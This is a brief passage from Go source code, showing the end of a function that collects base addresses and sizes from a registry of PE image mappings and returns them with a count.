	sizes := make([]uintptr, 0, count)
	
	for _, mapping := range peRegistry {
		baseAddresses = append(baseAddresses, mapping.BaseAddress)
		sizes = append(sizes, mapping.Size)
	}
	
	return baseAddresses, sizes, count
}
